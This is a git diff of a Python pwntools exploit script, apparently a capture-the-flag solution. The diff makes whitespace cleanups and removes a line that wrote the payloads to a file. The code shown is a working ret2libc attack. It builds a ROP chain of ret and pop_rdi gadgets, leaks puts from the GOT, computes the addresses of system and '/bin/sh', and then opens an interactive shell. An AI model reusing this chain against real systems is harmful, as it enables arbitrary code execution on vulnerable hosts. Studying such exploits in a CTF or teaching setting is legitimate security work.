@@ -46,13 +46,13 @@ def main():
 
     payload = b""
     payload += p64(ret) * (32 - 4)
-    
+
     payload += p64(pop_rdi)
     payload += p64(puts_got)
     payload += p64(puts_plt)
     payload += p64(get_input)
     payload += b"\x00"
-  
+
     r = conn()
 
     rep = r.recvuntil(b'Good luck ;)\n')
@@ -69,7 +69,7 @@ def main():
     except:
         exit(0)
 
-    
+
     offset = u64(leak) - puts_libc
     sys = offset + sys_libc
     bin_sh = offset + bin_sh_libc
@@ -85,11 +85,8 @@ def main():
 
     r.send(payload2)
 
-    open("toto","wb").write(payload + payload2) 
-    
-
     r.interactive()
- 
+
 
 if __name__ == "__main__":
     main()
